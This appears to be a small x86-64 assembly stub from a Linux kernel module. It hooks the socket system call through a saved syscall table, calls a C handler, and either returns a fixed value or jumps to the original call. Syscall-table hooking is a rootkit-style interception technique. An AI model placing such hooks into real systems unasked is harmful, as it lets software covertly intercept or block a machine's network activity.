#include <linux/unistd.h>
.text
.extern syscall_table_save
.extern hooked_socket_c
.globl hooked_socket

hooked_socket:
    call hooked_socket_c
    test %rax, %rax
    jz original_syscall

    mov $0xdeadbeef, %rax
    ret

original_syscall:
    movq syscall_table_save + __NR_socket*8(%rip), %rax
    jmp *%rax
